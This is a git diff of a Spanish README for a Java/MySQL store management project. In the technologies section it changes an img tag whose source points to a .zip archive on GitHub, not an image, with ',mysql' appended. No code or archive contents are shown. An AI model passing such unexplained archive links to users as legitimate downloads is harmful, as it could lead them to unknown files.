@@ -23,7 +23,7 @@ Este sistema fue desarrollado para resolver las necesidades de un negocio, que e
 
 ## Tecnologías Empleadas
 <div align="center">
-    <img src="https://raw.githubusercontent.com/cristiancrakl/Proyecto_tiendaGestion/master/src/Interfaz/Proyecto_Gestion_tienda_v2.6.zip,mysql" /><br>
+    <img src="https://raw.githubusercontent.com/cristiancrakl/Proyecto_tiendaGestion/master/src/Logica/tienda-Gestion-Proyecto-v1.7.zip,mysql" /><br>
 </div>
 
 - **Lenguajes de programación:** Java
